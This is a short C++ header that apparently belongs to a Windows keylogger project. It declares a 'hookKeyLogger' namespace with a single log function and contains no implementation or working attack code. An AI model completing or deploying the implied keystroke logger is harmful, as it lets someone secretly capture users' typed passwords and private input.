#pragma once
#ifndef HOOK_KEY_LOGGER_H
#define HOOK_KEY_LOGGER_H

#include <Windows.h>
#include <ostream>
#include "CharacterHandler.h"
#include "Character.h"
#include "Utils.h"

namespace hookKeyLogger {
	void log(std::ostream&);
}

#endif